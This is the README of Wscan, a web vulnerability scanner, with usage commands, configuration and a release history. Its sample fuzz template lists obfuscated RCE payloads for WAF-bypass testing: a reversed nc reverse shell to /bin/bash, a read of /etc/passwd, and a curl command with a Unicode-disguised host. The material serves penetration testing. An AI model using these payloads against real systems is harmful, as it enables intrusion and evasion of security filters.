# wscan
Wscan is a web security scanner that focuses on WEB security. It pays homage to Nmap, which has been open source for 25 years. We also plan to continuously update and keep Wscan open source for the next 25 years. We welcome anyone interested in web security to join our development team.

Our goal is to develop a tool for penetration testing using machine learning. Unlike other tools, our tool can automatically learn attack and defense patterns and launch personalized attacks based on specific targets. This way, our attack efficiency and accuracy will be significantly improved, while also reducing the probability of false positives.

Our tool employs machine learning technology to achieve fully automated web penetration testing. This means there is no need for manual addition and update of rules and signatures; it can automatically learn and adapt to new attack patterns and vulnerabilities.

Machine learning technology can also quickly process large amounts of data and traffic, thereby greatly improving testing efficiency and accuracy. In addition, it can identify and discover vulnerabilities and weaknesses that are difficult for humans to perceive, thus enhancing testing quality and reliability.

We believe that using machine learning technology for penetration testing will be a crucial direction for the future of network security. We hope that our tool can help more people safeguard network security and contribute to the field of network security.
![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/tool/github/9f9e48711df62c154bde487c989dd3a9.gif)
# Example Usage 
⬇️[Download Link](https://github.com/chushuai/wscan/releases)
```
(1) Active Scan
./wscan  --log-level=debug ws --basic-crawler http://testphp.vulnweb.com/ --json-output=wscan_scan_result.json --html-output=wscan_scan_result.html
./wscan  --log-level=debug ws --browser  http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html
./wscan  --log-level=debug ws --url http://testphp.vulnweb.com/listproducts.php?cat=1  --json-output=wscan_scan_result.json
./wscan  --log-level=debug ws --url-file=/wscan/url_file.txt --html-output=wscan_scan_result.html
./wscan  --log-level=debug ws --poc=/your_wscan_poc/wscan-poc/pocs/* --url http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html

(2) Passive Scan
./wscan  --log-level=debug ws --listen=127.0.0.1:1000 --json-output=wscan_scan_result.json  

(3）POC Scan
    3.1 POC download address https://github.com/chushuai/wscan-poc/releases
    3.2 When Wscan is first run, a file named config.yaml will be generated. You need to modify the following content in this file to specify the path of include_poc.
        prometheus:
            enabled: true
            depth: 1
            auto_load_poc: false
            include_poc:
                - C:\wscan_windows_amd64.exe\wscan-poc-1.0.0\pocs\*.yml
            exclude_poc: [] 
    3.3 Enable --plug=prometheus via command line, and specify the absolute path of --url-file (one URL per line) to conduct large-scale POC detection.
        ./wscan --log-level=debug ws --plug=prometheus  --url-file=/url_file.txt  --html-output=wscan_scan_result.html
(4) Custom web general vulnerability scanning template (Waf bypass/Waf testing)
    4.1 Unlike POC testing, the custom web general vulnerability scanning plugin will perform FUZZ on the parameters at the specified location.
        Sample reference https://github.com/chushuai/wscan/tree/main/core/plugins/custom_tmpl/tmpl/owasp
        Plugin sample
        ---
        payload:
          - $(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
          - /etc/passwd
          - "`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`"
        encoder:
          - URL
        placeholder:
          - URLParam
          - HTMLForm
          - HTMLMultipartForm
          - JSONRequest
        type: "RCE"
        ...
    4.2 You need to modify the following content in the config.yaml file to specify the path of include_tmpl.
        enabled: true
        depth: 0
        auto_load_tmpl: false 
        include_tmpl:
          - /wscan/core/plugins/custom_tmpl/tmpl/owasp/*.yml
        exclude_tmpl: [ ]
        block_status_codes: # When blocked by WAF, the HTTP status code list, default value is 403
          - 403
        pass_status_codes: # When not blocked by WAF, the HTTP status code list, default value is 200 or 404
          - 200
          - 404
        block_regex: "" # Regular expression for web pages blocked by WAF
        pass_regex: "" # Regular expression for web pages not blocked by WAF
        non_blocked_as_passed: false
    4.3 Enable --plug=custom_tmpl via command line to conduct custom Payload testing on the target website.
        ./wscan --log-level=debug ws --plug=custom_tmpl  --browser  http://testphp.vulnweb.com/  --html-output=wscan_scan_result.html
(5) Independent deployment of anti-connection module
./wscan  reverse
```




# Project Updates
* 2023.11.05 - Release v1.0.0 binary version, supporting simple web general vulnerability detection
* 2023.11.12 - Release v1.0.1 binary version, with static crawler
* 2023.11.12 - Release v1.0.2 binary version, supporting passive scanning
* 2023.11.19 - Release v1.0.3 binary version, supporting JSONP plugin
* 2023.11.26 - Release v1.0.4 binary version, fixing XSS and SQL injection false negatives, supporting vulnerability detection for individual URLs
* 2023.11.30 - Release v1.0.5 binary version, supporting browser crawler, URL and form intelligent filtering
* 2023.12.02 - Release v1.0.6 binary version, supporting output of scanning results in JSON and HTML formats
* 2023.12.03 - Release v1.0.7 binary version, supporting Yaml POC scanning plugin
* 2023.12.04 - Release v1.0.8 binary version, supporting specifying enabled plugins via command line
* 2023.12.09 - Release v1.0.9 binary version, supporting custom web general vulnerability scanning templates (Waf bypass/Waf testing)
* 2023.12.12 - Release v1.0.10 binary version, directory scanning includes 400 common rules, supporting custom scanning path bruteforce. Supporting ASP and PHP general command execution detection
* 2023.12.24 - Release v1.0.11 binary version, supporting standalone deployment of anti-connection module, with Yaml POC supporting anti-connection function
* 2023.12.30 - Release v1.0.12 binary version, supporting Goby JSON POC plugin, multi-layer URL directory POC scanning

# The open-source schedule is outlined as follows  
Wscan's goal is to create an open-source and non-profit project. However, due to the substantial workload involved in Wscan,
the code is still undergoing rapid iterations. Premature open-sourcing may lead to the emergence of various modified versions, 
which is not conducive to the tool's dissemination and the future development of the project. 
Therefore, the plan is to open-source the project in stages and modules, using Stars as a metric, 
to ensure the robustness of the project and organized community participation.

1.  YAML POC Scan Module (Open source when Stars > 400)  
2.  Reverse Connection Module (Open source when Stars > 400)  
3.  SQL Injection Module (Open source when Stars > 500)  
4.  Dynamic Crawler (Open source when Stars > 600)  
5.  Directory Scan Module (Open source when Stars > 700)  
6.  Baseline Scan (Open source when Stars > 800)  
7.  Plugin Scheduling Module Based on Message Subscription (Open source when Stars > 900)  
8.  HTTP Parameter Deformation Module; Traditional Scan Modules All Open Source; Users can modify, compile, and build scanners on their own (Open source when Stars > 1k)  
9.  Machine Learning Module to Reduce False Positives (Open source when Stars > 3k)  
10. Machine Learning Module for Automatic Payload Generation (Open source when Stars > 4k)  